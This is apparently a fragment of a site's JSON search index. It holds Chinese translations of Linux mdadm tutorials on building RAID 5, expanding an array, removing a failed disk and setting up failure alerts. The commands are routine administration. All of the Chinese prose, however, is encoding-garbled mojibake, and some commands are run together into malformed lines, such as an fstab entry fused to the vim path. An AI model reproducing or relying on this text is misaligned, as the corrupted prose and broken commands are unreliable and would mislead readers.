çš„è®¾å¤‡æ­£åœ¨è¿è¡Œå¹¶å·²ç»å¼€å§‹äº†é‡æ–°åŒæ­¥: mdadm --detail /dev/md0 éªŒè¯ RAID é˜µåˆ— ç¬¬4æ­¥ï¼šä¸º md0 åˆ›å»ºæ–‡ä»¶ç³»ç»Ÿ åœ¨æŒ‚è½½å‰ä¸º\"md0\"è®¾å¤‡åˆ›å»º ext4 æ–‡ä»¶ç³»ç»Ÿ: mkfs.ext4 /dev/md0 åˆ›å»º md0 æ–‡ä»¶ç³»ç»Ÿ ç°åœ¨ï¼Œåœ¨ /mnt ä¸‹åˆ›å»ºç›®å½• raid5ï¼Œ ç„¶åæŒ‚è½½æ–‡ä»¶ç³»ç»Ÿåˆ° /mnt/raid5/ ä¸‹ï¼Œå¹¶æ£€æŸ¥æŒ‚è½½ç‚¹ä¸‹çš„æ–‡ä»¶ï¼Œä½ ä¼šçœ‹åˆ° lost+found ç›®å½•: mkdir /mnt/raid5 mount /dev/md0 /mnt/raid5/ ls -l /mnt/raid5/ åœ¨æŒ‚è½½ç‚¹ /mnt/raid5 ä¸‹åˆ›å»ºå‡ ä¸ªæ–‡ä»¶ï¼Œå¹¶åœ¨å…¶ä¸­ä¸€ä¸ªæ–‡ä»¶ä¸­æ·»åŠ ä¸€äº›å†…å®¹ç„¶åå»éªŒè¯: touch /mnt/raid5/raid5_tecmint_{1..5} ls -l /mnt/raid5/ echo \"tecmint raid setups\" > /mnt/raid5/raid5_tecmint_1 cat /mnt/raid5/raid5_tecmint_1 cat /proc/mdstat æŒ‚è½½ RAID è®¾å¤‡ æˆ‘ä»¬éœ€è¦åœ¨ fstab ä¸­æ·»åŠ æ¡ç›®ï¼Œå¦åˆ™ç³»ç»Ÿé‡å¯åå°†ä¸ä¼šæ˜¾ç¤ºæˆ‘ä»¬çš„æŒ‚è½½ç‚¹ã€‚ ç¼–è¾‘ fstab æ–‡ä»¶æ·»åŠ æ¡ç›®ï¼Œåœ¨æ–‡ä»¶å°¾è¿½åŠ ä»¥ä¸‹è¡Œã€‚æŒ‚è½½ç‚¹ä¼šæ ¹æ®ä½ ç¯å¢ƒçš„ä¸åŒè€Œä¸åŒ: vim /etc/fstab/dev/md0 /mnt/raid5 ext4 defaults 0 0 è‡ªåŠ¨æŒ‚è½½ RAID 5 æ¥ä¸‹æ¥ï¼Œè¿è¡Œ mount -av å‘½ä»¤æ£€æŸ¥ fstab æ¡ç›®ä¸­æ˜¯å¦æœ‰é”™è¯¯: mount -av æ£€æŸ¥ Fstab é”™è¯¯ ç¬¬5æ­¥ï¼šä¿å­˜ Raid 5 çš„é…ç½® åœ¨å‰é¢ç« èŠ‚å·²ç»è¯´è¿‡ï¼Œé»˜è®¤æƒ…å†µä¸‹ RAID æ²¡æœ‰é…ç½®æ–‡ä»¶ã€‚ æˆ‘ä»¬å¿…é¡»æ‰‹åŠ¨ä¿å­˜ã€‚å¦‚æœæ­¤æ­¥ä¸­æ²¡æœ‰è·Ÿéšä¸å±äº md0 çš„ RAID è®¾å¤‡ï¼Œå®ƒä¼šæ˜¯ä¸€äº›å…¶ä»–éšæœºæ•°å­—ã€‚ æ‰€ä»¥ï¼Œæˆ‘ä»¬å¿…é¡»è¦åœ¨ç³»ç»Ÿé‡æ–°å¯åŠ¨ä¹‹å‰ä¿å­˜é…ç½®ã€‚ å¦‚æœé…ç½®ä¿å­˜å®ƒåœ¨ç³»ç»Ÿé‡æ–°å¯åŠ¨æ—¶ä¼šè¢«åŠ è½½åˆ°å†…æ ¸ä¸­ç„¶å RAID ä¹Ÿå°†è¢«åŠ è½½: mdadm --detail --scan --verbose >> /etc/mdadm.conf ä¿å­˜ RAID 5 é…ç½® æ³¨æ„ï¼šä¿å­˜é…ç½®å°†ä¿æŒ md0 è®¾å¤‡çš„ RAID çº§åˆ«ç¨³å®šä¸å˜ã€‚ ç¬¬6æ­¥ï¼šæ·»åŠ å¤‡ç”¨ç£ç›˜ å¤‡ç”¨ç£ç›˜æœ‰ä»€ä¹ˆç”¨ï¼Ÿå®ƒæ˜¯éå¸¸æœ‰ç”¨çš„ï¼Œå¦‚æœæˆ‘ä»¬æœ‰ä¸€ä¸ªå¤‡ç”¨ç£ç›˜ï¼Œ å½“æˆ‘ä»¬é˜µåˆ—ä¸­çš„ä»»ä½•ä¸€ä¸ªç£ç›˜å‘ç”Ÿæ•…éšœåï¼Œè¿™ä¸ªå¤‡ç”¨ç£ç›˜ä¼šè¿›å…¥æ¿€æ´»é‡å»ºè¿‡ç¨‹ï¼Œå¹¶ä»å…¶ä»–ç£ç›˜ä¸ŠåŒæ­¥æ•°æ®ï¼Œè¿™æ ·å°±æœ‰äº†å†—ä½™ã€‚ æ›´å¤šå…³äºæ·»åŠ å¤‡ç”¨ç£ç›˜å’Œæ£€æŸ¥ RAID 5 å®¹é”™çš„æŒ‡ä»¤ï¼Œè¯·é˜…è¯»ä¸‹é¢æ–‡ç« ä¸­çš„ç¬¬6æ­¥å’Œç¬¬7æ­¥ã€‚ åœ¨ RAID 5 ä¸­æ·»åŠ å¤‡ç”¨ç£ç›˜","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Tutorial-Raid-Create-RAID-5-(strip--oriented-and-distributed-strange-puppet-verification).html","loc":"/yq-doc-source-docs-operating-system-linux-Tutorial-Raid-Create-RAID-5-(strip--oriented-and-distributed-strange-puppet-verification).html"},{"title":"åœ¨ RAID ä¸­æ‰©å±•ç°æœ‰çš„ RAID é˜µåˆ—å’Œåˆ é™¤æ•…éšœçš„ç£ç›˜","text":"å‚è€ƒ:: ä½œè€…: Babin Lonston è¯‘è€…: LCTT è¯‘è€…: struggling è¯„è®º: https://linux.cn/portal.php?mod=comment&id=6123&idtype=aid æ¯ä¸ªæ–°æ‰‹éƒ½ä¼šå¯¹é˜µåˆ—ï¼ˆarrayï¼‰è¿™ä¸ªè¯æ‰€ä»£è¡¨çš„æ„æ€äº§ç”Ÿç–‘æƒ‘ã€‚ é˜µåˆ—åªæ˜¯ç£ç›˜çš„ä¸€ä¸ªé›†åˆã€‚ æ¢å¥è¯è¯´ï¼Œæˆ‘ä»¬å¯ä»¥ç§°é˜µåˆ—ä¸ºä¸€ä¸ªé›†åˆï¼ˆsetï¼‰æˆ–ä¸€ç»„ï¼ˆgroupï¼‰ã€‚ å°±åƒä¸€ç»„é¸¡è›‹ä¸­åŒ…å«6ä¸ªä¸€æ ·ã€‚åŒæ · RAID é˜µåˆ—ä¸­åŒ…å«ç€å¤šä¸ªç£ç›˜ï¼Œ å¯èƒ½æ˜¯2ï¼Œ4ï¼Œ6ï¼Œ8ï¼Œ12ï¼Œ16ç­‰ï¼Œå¸Œæœ›ä½ ç°åœ¨çŸ¥é“äº†ä»€ä¹ˆæ˜¯é˜µåˆ—ã€‚ åœ¨è¿™é‡Œï¼Œæˆ‘ä»¬å°†çœ‹åˆ°å¦‚ä½•æ‰©å±•ç°æœ‰çš„é˜µåˆ—æˆ– RAID ç»„ã€‚ ä¾‹å¦‚ï¼Œå¦‚æœæˆ‘ä»¬åœ¨é˜µåˆ—ä¸­ä½¿ç”¨2ä¸ªç£ç›˜å½¢æˆä¸€ä¸ª raid 1 é›†åˆï¼Œ åœ¨æŸäº›æƒ…å†µï¼Œå¦‚æœè¯¥ç»„ä¸­éœ€è¦æ›´å¤šçš„ç©ºé—´ï¼Œå°±å¯ä»¥ä½¿ç”¨ mdadm -grow å‘½ä»¤æ¥æ‰©å±•é˜µåˆ—å¤§å°ï¼Œ åªéœ€è¦å°†ä¸€ä¸ªç£ç›˜åŠ å…¥åˆ°ç°æœ‰çš„é˜µåˆ—ä¸­å³å¯ã€‚ åœ¨è¯´å®Œæ‰©å±•ï¼ˆæ·»åŠ ç£ç›˜åˆ°ç°æœ‰çš„é˜µåˆ—ä¸­ï¼‰åï¼Œæˆ‘ä»¬å°†çœ‹çœ‹å¦‚ä½•ä»é˜µåˆ—ä¸­åˆ é™¤æ•…éšœçš„ç£ç›˜ã€‚ æ‰©å±• RAID é˜µåˆ—å’Œåˆ é™¤æ•…éšœçš„ç£ç›˜ å‡è®¾ç£ç›˜ä¸­çš„ä¸€ä¸ªæœ‰é—®é¢˜äº†éœ€è¦åˆ é™¤è¯¥ç£ç›˜ï¼Œä½†æˆ‘ä»¬éœ€è¦åœ¨åˆ é™¤ç£ç›˜å‰æ·»åŠ ä¸€ä¸ªå¤‡ç”¨ç£ç›˜æ¥æ‰©å±•è¯¥é•œåƒï¼Œ å› ä¸ºæˆ‘ä»¬éœ€è¦ä¿å­˜æˆ‘ä»¬çš„æ•°æ®ã€‚å½“ç£ç›˜å‘ç”Ÿæ•…éšœæ—¶æˆ‘ä»¬éœ€è¦ä»é˜µåˆ—ä¸­åˆ é™¤å®ƒï¼Œè¿™æ˜¯è¿™ä¸ªä¸»é¢˜ä¸­æˆ‘ä»¬å°†è¦å­¦ä¹ åˆ°çš„ã€‚ æ‰©å±• RAID çš„ç‰¹æ€§ æˆ‘ä»¬å¯ä»¥å¢åŠ ï¼ˆæ‰©å±•ï¼‰ä»»æ„ RAID é›†åˆçš„å¤§å°ã€‚ æˆ‘ä»¬å¯ä»¥åœ¨ä½¿ç”¨æ–°ç£ç›˜æ‰©å±• RAID é˜µåˆ—ååˆ é™¤æ•…éšœçš„ç£ç›˜ã€‚ æˆ‘ä»¬å¯ä»¥æ‰©å±• RAID é˜µåˆ—è€Œæ— éœ€åœæœºã€‚ è¦æ±‚ ä¸ºäº†æ‰©å±•ä¸€ä¸ªRAIDé˜µåˆ—ï¼Œæˆ‘ä»¬éœ€è¦ä¸€ä¸ªå·²æœ‰çš„ RAID ç»„ï¼ˆé˜µåˆ—ï¼‰ã€‚ æˆ‘ä»¬éœ€è¦é¢å¤–çš„ç£ç›˜æ¥æ‰©å±•é˜µåˆ—ã€‚ åœ¨è¿™é‡Œï¼Œæˆ‘ä»¬ä½¿ç”¨ä¸€å—ç£ç›˜æ¥æ‰©å±•ç°æœ‰çš„é˜µåˆ—ã€‚ åœ¨æˆ‘ä»¬äº†è§£æ‰©å±•å’Œæ¢å¤é˜µåˆ—å‰ï¼Œæˆ‘ä»¬å¿…é¡»äº†è§£æœ‰å…³ RAID çº§åˆ«å’Œè®¾ç½®çš„åŸºæœ¬çŸ¥è¯†ã€‚ç‚¹å‡»ä¸‹é¢çš„é“¾æ¥äº†è§£è¿™äº›ã€‚ åŸæ–‡ ä»‹ç» RAID çš„çº§åˆ«å’Œæ¦‚å¿µ ä½¿ç”¨ mdadm å·¥å…·åˆ›å»ºè½¯ä»¶ RAID 0 ï¼ˆæ¡å¸¦åŒ–ï¼‰ æœåŠ¡å™¨è®¾ç½®: æ“ä½œç³»ç»Ÿ : CentOS 6.5 Final IPåœ°å€ : 192.168.0.230 ä¸»æœºå : grow.tecmintlocal.com 2 å—ç°æœ‰ç£ç›˜ : 1 GB 1 å—é¢å¤–ç£ç›˜ : 1 GB åœ¨è¿™é‡Œï¼Œæˆ‘ä»¬å·²æœ‰ä¸€ä¸ª RAID ï¼Œæœ‰2å—ç£ç›˜ï¼Œæ¯ä¸ªå¤§å°ä¸º1GBï¼Œ æˆ‘ä»¬ç°åœ¨å†å¢åŠ ä¸€ä¸ªç£ç›˜åˆ°æˆ‘ä»¬ç°æœ‰çš„ RAID é˜µåˆ—ä¸­ï¼Œå…¶å¤§å°ä¸º1GBã€‚ æ‰©å±•ç°æœ‰çš„ RAID é˜µåˆ— åœ¨æ‰©å±•é˜µåˆ—å‰ï¼Œé¦–å…ˆä½¿ç”¨ä¸‹é¢çš„å‘½ä»¤åˆ—å‡ºç°æœ‰çš„ RAID é˜µåˆ—: mdadm --detail /dev/md0 æ£€æŸ¥ç°æœ‰çš„ RAID é˜µåˆ— æ³¨è§£ ä»¥ä¸Šè¾“å‡ºæ˜¾ç¤ºï¼Œå·²ç»æœ‰äº†ä¸¤ä¸ªç£ç›˜åœ¨ RAID é˜µåˆ—ä¸­ï¼Œçº§åˆ«ä¸º RAID 1ã€‚ç°åœ¨æˆ‘ä»¬å¢åŠ ä¸€ä¸ªç£ç›˜åˆ°ç°æœ‰çš„é˜µåˆ—é‡Œã€‚ ç°åœ¨è®©æˆ‘ä»¬æ·»åŠ æ–°çš„ç£ç›˜\"sdd\"ï¼Œå¹¶ä½¿ç”¨ fdisk å‘½ä»¤æ¥åˆ›å»ºåˆ†åŒº: fdisk /dev/sdd è¯·ä½¿ç”¨ä»¥ä¸‹æ­¥éª¤ä¸º /dev/sdd åˆ›å»ºä¸€ä¸ªæ–°çš„åˆ†åŒºã€‚ æŒ‰ n åˆ›å»ºæ–°çš„åˆ†åŒºã€‚ ç„¶åæŒ‰ P é€‰æ‹©ä¸»åˆ†åŒºã€‚ æ¥ä¸‹æ¥é€‰æ‹©åˆ†åŒºå·ä¸º1ã€‚ åªéœ€æŒ‰ä¸¤æ¬¡å›è½¦é”®é€‰æ‹©é»˜è®¤å€¼å³å¯ã€‚ ç„¶åï¼ŒæŒ‰ P æ¥æ‰“å°åˆ›å»ºå¥½çš„åˆ†åŒºã€‚ æŒ‰ L ï¼Œåˆ—å‡ºæ‰€æœ‰å¯ç”¨çš„ç±»å‹ã€‚ æŒ‰ t å»ä¿®æ”¹åˆ†åŒºã€‚ é”®å…¥ fd è®¾ç½®ä¸º Linux çš„ RAID ç±»å‹ï¼Œç„¶åæŒ‰å›è½¦ç¡®è®¤ã€‚ ç„¶åå†æ¬¡ä½¿ç”¨ p æŸ¥çœ‹æˆ‘ä»¬æ‰€åšçš„æ›´æ”¹ã€‚ ä½¿ç”¨ w ä¿å­˜æ›´æ”¹ã€‚ ä¸º sdd åˆ›å»ºæ–°çš„åˆ†åŒº ä¸€æ—¦æ–°çš„ sdd åˆ†åŒºåˆ›å»ºå®Œæˆåï¼Œä½ å¯ä»¥ä½¿ç”¨ä¸‹é¢çš„å‘½ä»¤éªŒè¯å®ƒ: ls -l /dev/ | grep sd ç¡®è®¤ sdd åˆ†åŒº æ¥ä¸‹æ¥ï¼Œåœ¨æ·»åŠ åˆ°é˜µåˆ—å‰å…ˆæ£€æŸ¥ç£ç›˜æ˜¯å¦æœ‰ RAID åˆ†åŒº: mdadm --examine /dev/sdd1 åœ¨ sdd åˆ†åŒºä¸­æ£€æŸ¥ RAID æ³¨è§£ ä»¥ä¸Šè¾“å‡ºæ˜¾ç¤ºï¼Œè¯¥ç›˜æœ‰æ²¡æœ‰å‘ç° super-blocksï¼Œæ„å‘³ç€æˆ‘ä»¬å¯ä»¥å°†æ–°çš„ç£ç›˜æ·»åŠ åˆ°ç°æœ‰é˜µåˆ—ã€‚ è¦æ·»åŠ æ–°çš„åˆ†åŒº /dev/sdd1 åˆ°ç°æœ‰çš„é˜µåˆ— md0ï¼Œè¯·ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤: mdadm --manage /dev/md0 --add /dev/sdd1 æ·»åŠ ç£ç›˜åˆ° RAID é˜µåˆ— ä¸€æ—¦æ–°çš„ç£ç›˜è¢«æ·»åŠ åï¼Œåœ¨æˆ‘ä»¬çš„é˜µåˆ—ä¸­æ£€æŸ¥æ–°æ·»åŠ çš„ç£ç›˜: mdadm --detail /dev/md0 ç¡®è®¤å°†æ–°ç£ç›˜æ·»åŠ åˆ° RAID ä¸­ æ³¨è§£ åœ¨ä¸Šé¢çš„è¾“å‡ºï¼Œä½ å¯ä»¥çœ‹åˆ°ç£ç›˜å·²ç»è¢«æ·»åŠ ä½œä¸ºå¤‡ç”¨çš„ã€‚åœ¨è¿™é‡Œï¼Œæˆ‘ä»¬çš„é˜µåˆ—ä¸­å·²ç»æœ‰äº†2ä¸ªç£ç›˜ï¼Œä½†æˆ‘ä»¬æœŸå¾…é˜µåˆ—ä¸­æœ‰3ä¸ªç£ç›˜ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦æ‰©å±•é˜µåˆ—ã€‚ è¦æ‰©å±•é˜µåˆ—ï¼Œæˆ‘ä»¬éœ€è¦ä½¿ç”¨ä¸‹é¢çš„å‘½ä»¤: mdadm --grow --raid-devices=3 /dev/md0 æ‰©å±• Raid é˜µåˆ— ç°åœ¨æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ç¬¬ä¸‰å—ç£ç›˜(sdd1)å·²è¢«æ·»åŠ åˆ°é˜µåˆ—ä¸­ï¼Œåœ¨ç¬¬ä¸‰å—ç£ç›˜è¢«æ·»åŠ åï¼Œå®ƒå°†ä»å¦å¤–ä¸¤å—ç£ç›˜ä¸ŠåŒæ­¥æ•°æ®: mdadm --detail /dev/md0 ç¡®è®¤ Raid é˜µåˆ— æ³¨è§£ å¯¹äºå¤§å®¹é‡ç£ç›˜ä¼šéœ€è¦å‡ ä¸ªå°æ—¶æ¥åŒæ­¥æ•°æ®ã€‚åœ¨è¿™é‡Œï¼Œæˆ‘ä»¬ä½¿ç”¨çš„æ˜¯1GBçš„è™šæ‹Ÿç£ç›˜ï¼Œæ‰€ä»¥å®ƒéå¸¸å¿«åœ¨å‡ ç§’é’Ÿå†…ä¾¿ä¼šå®Œæˆã€‚ ä»é˜µåˆ—ä¸­åˆ é™¤ç£ç›˜ åœ¨æ•°æ®è¢«ä»å…¶ä»–ä¸¤ä¸ªç£ç›˜åŒæ­¥åˆ°æ–°ç£ç›˜ sdd1 åï¼Œç°åœ¨ä¸‰ä¸ªç£ç›˜ä¸­çš„æ•°æ®å·²ç»ç›¸åŒäº†ï¼ˆé•œåƒï¼‰ã€‚ æ­£å¦‚æˆ‘å‰é¢æ‰€è¯´çš„ï¼Œå‡å®šä¸€ä¸ªç£ç›˜å‡ºé—®é¢˜äº†éœ€è¦è¢«åˆ é™¤ã€‚æ‰€ä»¥ï¼Œç°åœ¨å‡è®¾ç£ç›˜ sdc1 å‡ºé—®é¢˜äº†ï¼Œéœ€è¦ä»ç°æœ‰é˜µåˆ—ä¸­åˆ é™¤ã€‚ åœ¨åˆ é™¤ç£ç›˜å‰æˆ‘ä»¬è¦å°†å…¶æ ‡è®°ä¸ºå¤±æ•ˆï¼Œç„¶åæˆ‘ä»¬æ‰å¯ä»¥å°†å…¶åˆ é™¤: mdadm --fail /dev/md0 /dev/sdc1### mdadm --detail /dev/md0 åœ¨ RAID é˜µåˆ—ä¸­æ¨¡æ‹Ÿç£ç›˜æ•…éšœ* ä»ä¸Šé¢çš„è¾“å‡ºä¸­ï¼Œæˆ‘ä»¬æ¸…æ¥šåœ°çœ‹åˆ°ï¼Œç£ç›˜åœ¨ä¸‹é¢è¢«æ ‡è®°ä¸º faultyã€‚ å³ä½¿å®ƒæ˜¯ faulty çš„ï¼Œæˆ‘ä»¬ä»ç„¶å¯ä»¥çœ‹åˆ° raid è®¾å¤‡æœ‰3ä¸ªï¼Œ1ä¸ªæŸåäº†ï¼ŒçŠ¶æ€æ˜¯ degradedã€‚ ç°åœ¨æˆ‘ä»¬è¦ä»é˜µåˆ—ä¸­åˆ é™¤ faulty çš„ç£ç›˜ï¼Œraid è®¾å¤‡å°†åƒä¹‹å‰ä¸€æ ·ç»§ç»­æœ‰2ä¸ªè®¾å¤‡: mdadm --remove /dev/md0 /dev/sdc1 åœ¨ Raid é˜µåˆ—ä¸­åˆ é™¤ç£ç›˜ ä¸€æ—¦æ•…éšœçš„ç£ç›˜è¢«åˆ é™¤ï¼Œç„¶åæˆ‘ä»¬åªèƒ½ä½¿ç”¨2ä¸ªç£ç›˜æ¥æ‰©å±• raid é˜µåˆ—äº†: mdadm --grow --raid-devices=2 /dev/md0### mdadm --detail /dev/md0 åœ¨ RAID é˜µåˆ—æ‰©å±•ç£ç›˜ ä»ä¸Šé¢çš„è¾“å‡ºä¸­å¯ä»¥çœ‹åˆ°ï¼Œæˆ‘ä»¬çš„é˜µåˆ—ä¸­ä»…æœ‰2å°è®¾å¤‡ã€‚ å¦‚æœä½ éœ€è¦å†æ¬¡æ‰©å±•é˜µåˆ—ï¼ŒæŒ‰ç…§å¦‚ä¸Šæ‰€è¿°çš„åŒæ ·æ­¥éª¤è¿›è¡Œã€‚ å¦‚æœä½ éœ€è¦æ·»åŠ ä¸€ä¸ªç£ç›˜ä½œä¸ºå¤‡ç”¨ï¼Œå°†å…¶æ ‡è®°ä¸º spareï¼Œå› æ­¤ï¼Œå¦‚æœç£ç›˜å‡ºç°æ•…éšœæ—¶ï¼Œå®ƒä¼šè‡ªåŠ¨é¡¶ä¸Šå»å¹¶é‡å»ºæ•°æ®ã€‚ ç»“è®º åœ¨è¿™ç¯‡æ–‡ç« ä¸­ï¼Œæˆ‘ä»¬å·²ç»çœ‹åˆ°äº†å¦‚ä½•æ‰©å±•ç°æœ‰çš„ RAID é›†åˆï¼Œä»¥åŠå¦‚ä½•åœ¨é‡æ–°åŒæ­¥å·²æœ‰ç£ç›˜çš„æ•°æ®åä»ä¸€ä¸ªé˜µåˆ—ä¸­åˆ é™¤æ•…éšœç£ç›˜ã€‚ æ‰€æœ‰è¿™äº›æ­¥éª¤éƒ½å¯ä»¥ä¸ç”¨åœæœºæ¥å®Œæˆã€‚åœ¨æ•°æ®åŒæ­¥æœŸé—´ï¼Œç³»ç»Ÿç”¨æˆ·ï¼Œæ–‡ä»¶å’Œåº”ç”¨ç¨‹åºä¸ä¼šå—åˆ°ä»»ä½•å½±å“ã€‚ åœ¨æ¥ä¸‹æ¥çš„æ–‡ç« æˆ‘å°†å‘Šè¯‰ä½ å¦‚ä½•ç®¡ç† RAIDï¼Œæ•¬è¯·å…³æ³¨æ›´æ–°ï¼Œä¸è¦å¿˜äº†å†™è¯„è®ºã€‚","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Tutorial-Raid-Extend-the-existing-RAID-array-and-delete-the-fault-disk-in-RAID.html","loc":"/yq-doc-source-docs-operating-system-linux-Tutorial-Raid-Extend-the-existing-RAID-array-and-delete-the-fault-disk-in-RAID.html"},{"title":"å½“è½¯ä»¶ RAID æ•…éšœæ—¶å¦‚ä½•æ¢å¤å’Œé‡å»ºæ•°æ®","text":"å‚è€ƒ:: ä½œè€…: Babin Lonston è¯‘è€…: LCTT è¯‘è€…: struggling < https://linux.cn/portal.php?mod=comment&id=6448&idtype=aid >`_ åœ¨é˜…è¯»è¿‡ RAID ç³»åˆ— å‰é¢çš„æ–‡ç« åä½ å·²ç»å¯¹ RAID æ¯”è¾ƒç†Ÿæ‚‰äº†ã€‚ å›é¡¾å‰é¢å‡ ä¸ªè½¯ä»¶ RAID çš„é…ç½®ï¼Œæˆ‘ä»¬å¯¹æ¯ä¸€ä¸ªéƒ½åšäº†è¯¦ç»†çš„è§£é‡Šï¼Œä½¿ç”¨å“ªä¸€ä¸ªå–å†³ä¸ä½ çš„å…·ä½“æƒ…å†µã€‚ åœ¨æœ¬æ–‡ä¸­ï¼Œæˆ‘ä»¬å°†è®¨è®ºå½“ä¸€ä¸ªç£ç›˜å‘ç”Ÿæ•…éšœæ—¶å¦‚ä½•é‡å»ºè½¯ä»¶ RAID é˜µåˆ—å¹¶ä¸”ä¸ä¼šä¸¢å¤±æ•°æ®ã€‚ ä¸ºæ–¹ä¾¿èµ·è§ï¼Œæˆ‘ä»¬ä»…è€ƒè™‘RAID 1 çš„é…ç½® - ä½†å…¶æ–¹æ³•å’Œæ¦‚å¿µé€‚ç”¨äºæ‰€æœ‰æƒ…å†µã€‚ RAID æµ‹è¯•æ–¹æ¡ˆ åœ¨è¿›ä¸€æ­¥è®¨è®ºä¹‹å‰ï¼Œè¯·ç¡®ä¿ä½ å·²ç»é…ç½®å¥½äº† RAID 1 é˜µåˆ—ï¼Œ å¯ä»¥æŒ‰ç…§æœ¬ç³»åˆ—ç¬¬3éƒ¨åˆ†æä¾›çš„æ–¹æ³•: åœ¨ Linux ä¸­å¦‚ä½•åˆ›å»º RAID 1ï¼ˆé•œåƒï¼‰ åœ¨ç›®å‰çš„æƒ…å†µä¸‹ï¼Œä»…æœ‰çš„å˜åŒ–æ˜¯ï¼š ä½¿ç”¨ä¸åŒç‰ˆæœ¬ CentOSï¼ˆv7ï¼‰ï¼Œè€Œä¸æ˜¯å‰é¢æ–‡ç« ä¸­çš„ï¼ˆv6.5ï¼‰ã€‚ ç£ç›˜å®¹é‡å‘ç”Ÿæ”¹å˜ï¼Œ /dev/sdb å’Œ /dev/sdcï¼ˆå„8GBï¼‰ã€‚ æ­¤å¤–ï¼Œå¦‚æœ SELinux è®¾ç½®ä¸º enforcing æ¨¡å¼ï¼Œä½ éœ€è¦å°†ç›¸åº”çš„æ ‡ç­¾æ·»åŠ åˆ°æŒ‚è½½ RAID è®¾å¤‡çš„ç›®å½•ä¸­ã€‚ å¦åˆ™ï¼Œå½“ä½ è¯•å›¾æŒ‚è½½æ—¶ï¼Œä½ ä¼šç¢°åˆ°è¿™æ ·çš„è­¦å‘Šä¿¡æ¯ï¼š å¯ç”¨ SELinux æ—¶ RAID æŒ‚è½½é”™è¯¯ é€šè¿‡ä»¥ä¸‹å‘½ä»¤æ¥è§£å†³: restorecon -R /mnt/raid1 é…ç½® RAID ç›‘æ§ å­˜å‚¨è®¾å¤‡æŸåçš„åŸå› å¾ˆå¤šï¼ˆå°½ç®¡å›ºæ€ç¡¬ç›˜å¤§å¤§å‡å°‘äº†è¿™ç§æƒ…å†µå‘ç”Ÿçš„å¯èƒ½æ€§ï¼‰ï¼Œä½†ä¸ç®¡æ˜¯ä»€ä¹ˆåŸå› ï¼Œ å¯ä»¥è‚¯å®šé—®é¢˜éšæ—¶å¯èƒ½å‘ç”Ÿï¼Œä½ éœ€è¦å‡†å¤‡å¥½æ›¿æ¢å‘ç”Ÿæ•…éšœçš„éƒ¨åˆ†ï¼Œå¹¶ç¡®ä¿æ•°æ®çš„å¯ç”¨æ€§å’Œå®Œæ•´æ€§ã€‚ é¦–å…ˆå»ºè®®æ˜¯ã€‚è™½ç„¶ä½ å¯ä»¥æŸ¥çœ‹ /proc/mdstat æ¥æ£€æŸ¥ RAID çš„çŠ¶æ€ï¼Œä½†æœ‰ä¸€ä¸ªæ›´å¥½çš„å’ŒèŠ‚çœæ—¶é—´çš„æ–¹æ³•ï¼Œ ä½¿ç”¨ç›‘æ§ + æ‰«ææ¨¡å¼è¿è¡Œ mdadmï¼Œå®ƒå°†è­¦æŠ¥é€šè¿‡ç”µå­é‚®ä»¶å‘é€åˆ°ä¸€ä¸ªé¢„å®šä¹‰çš„æ”¶ä»¶äººã€‚ è¦è¿™æ ·è®¾ç½®ï¼Œåœ¨ /etc/mdadm.conf æ·»åŠ ä»¥ä¸‹è¡Œ: MAILADDR user@<domain or localhost> æˆ‘è‡ªå·±çš„è®¾ç½®å¦‚ä¸‹: MAILADDR gacanepa@localhost ç›‘æ§ RAID å¹¶ä½¿ç”¨ç”µå­é‚®ä»¶è¿›è¡ŒæŠ¥è­¦ è¦è®© mdadm è¿è¡Œåœ¨ç›‘æ§ + æ‰«ææ¨¡å¼ä¸­ï¼Œä»¥ root ç”¨æˆ·æ·»åŠ ä»¥ä¸‹ crontab æ¡ç›®: @reboot /sbin/mdadm --monitor --scan --oneshot é»˜è®¤æƒ…å†µä¸‹ï¼Œmdadm æ¯éš”60ç§’ä¼šæ£€æŸ¥ RAID é˜µåˆ—ï¼Œå¦‚æœå‘ç°é—®é¢˜å°†å‘å‡ºè­¦æŠ¥ã€‚ ä½ å¯ä»¥é€šè¿‡æ·»åŠ  --delay é€‰é¡¹åˆ°crontab æ¡ç›®ä¸Šé¢ï¼Œåé¢è·Ÿä¸Šç§’æ•°ï¼Œæ¥ä¿®æ”¹é»˜è®¤è¡Œä¸ºï¼ˆä¾‹å¦‚ï¼Œ --delay 1800æ„å‘³ç€30åˆ†é’Ÿï¼‰ã€‚ æœ€åï¼Œç¡®ä¿ä½ å·²ç»å®‰è£…äº†ä¸€ä¸ªé‚®ä»¶ç”¨æˆ·ä»£ç†ï¼ˆMUAï¼‰ï¼Œ å¦‚ mutt æˆ– mailx . å¦åˆ™ï¼Œä½ å°†ä¸ä¼šæ”¶åˆ°ä»»ä½•è­¦æŠ¥ã€‚ åœ¨ä¸€åˆ†é’Ÿå†…ï¼Œæˆ‘ä»¬å°±ä¼šçœ‹åˆ° mdadm å‘é€çš„è­¦æŠ¥ã€‚ æ¨¡æ‹Ÿå’Œæ›´æ¢å‘ç”Ÿæ•…éšœçš„ RAID å­˜å‚¨è®¾å¤‡ ä¸ºäº†ç»™ RAID é˜µåˆ—ä¸­çš„å­˜å‚¨è®¾å¤‡æ¨¡æ‹Ÿä¸€ä¸ªæ•…éšœï¼Œæˆ‘ä»¬å°†ä½¿ç”¨ --manage å’Œ --set-faulty é€‰é¡¹ï¼Œå¦‚ä¸‹æ‰€ç¤º: mdadm --manage --set-faulty /dev/md0 /dev/sdc1 è¿™å°†å¯¼è‡´ /dev/sdc1 è¢«æ ‡è®°ä¸º faultyï¼Œæˆ‘ä»¬å¯ä»¥åœ¨ /proc/mdstat çœ‹åˆ°ï¼š åœ¨ RAID å­˜å‚¨è®¾å¤‡ä¸Šæ¨¡æ‹Ÿé—®é¢˜ æ›´é‡è¦çš„æ˜¯ï¼Œè®©æˆ‘ä»¬çœ‹çœ‹æ˜¯ä¸æ˜¯æ”¶åˆ°äº†åŒæ ·çš„è­¦æŠ¥é‚®ä»¶: RAID è®¾å¤‡æ•…éšœæ—¶å‘é€é‚®ä»¶è­¦æŠ¥ åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œä½ éœ€è¦ä»è½¯ä»¶ RAID é˜µåˆ—ä¸­åˆ é™¤è¯¥è®¾å¤‡: mdadm /dev/md0 --remove /dev/sdc1 ç„¶åï¼Œä½ 